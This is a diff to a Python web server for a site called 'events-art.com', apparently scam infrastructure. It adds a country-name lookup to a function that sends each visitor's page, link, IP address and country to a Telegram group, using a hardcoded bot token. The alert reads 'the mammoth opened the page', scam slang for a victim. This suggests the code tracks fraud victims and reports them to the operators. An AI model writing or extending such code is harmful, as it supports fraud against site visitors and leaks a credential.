@@ -11,6 +11,59 @@ import sqlite3
 PORT = 80  # Стандартный HTTP порт
 DIRECTORY = "events-art.com"  # Папка з сайтом
 
+# --- Country code to full name mapping ---
+COUNTRY_NAMES = {
+    'UA': 'Ukraine',
+    'RU': 'Russia',
+    'PL': 'Poland',
+    'DE': 'Germany',
+    'FR': 'France',
+    'IT': 'Italy',
+    'ES': 'Spain',
+    'GB': 'United Kingdom',
+    'US': 'United States',
+    'NL': 'Netherlands',
+    'TR': 'Turkey',
+    'KZ': 'Kazakhstan',
+    'BY': 'Belarus',
+    'LT': 'Lithuania',
+    'LV': 'Latvia',
+    'EE': 'Estonia',
+    'CZ': 'Czech Republic',
+    'SK': 'Slovakia',
+    'RO': 'Romania',
+    'MD': 'Moldova',
+    'GE': 'Georgia',
+    'AM': 'Armenia',
+    'AZ': 'Azerbaijan',
+    'BG': 'Bulgaria',
+    'GR': 'Greece',
+    'HU': 'Hungary',
+    'FI': 'Finland',
+    'SE': 'Sweden',
+    'NO': 'Norway',
+    'DK': 'Denmark',
+    'BE': 'Belgium',
+    'CH': 'Switzerland',
+    'AT': 'Austria',
+    'IE': 'Ireland',
+    'PT': 'Portugal',
+    'HR': 'Croatia',
+    'RS': 'Serbia',
+    'SI': 'Slovenia',
+    'BA': 'Bosnia and Herzegovina',
+    'ME': 'Montenegro',
+    'MK': 'North Macedonia',
+    'AL': 'Albania',
+    'LU': 'Luxembourg',
+    'LI': 'Liechtenstein',
+    'IS': 'Iceland',
+    'CA': 'Canada',
+    'AU': 'Australia',
+    'NZ': 'New Zealand',
+    # ... додайте інші країни за потреби ...
+}
+
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
     GROUP_ID = -828011200  # group id з main.py
@@ -24,12 +77,14 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None):
                 country = data.get("country", "")
         except Exception:
             country = ""
+    # Перетворюємо код країни на повну назву
+    country_full = COUNTRY_NAMES.get(country, country)
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
         f"🔗 Ссылка: {link}\n"
         f"🌍 IP: {ip}\n"
-        f"🌏 Страна: {country}"
+        f"🌏 Страна: {country_full}"
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data_group = {"chat_id": GROUP_ID, "text": msg}
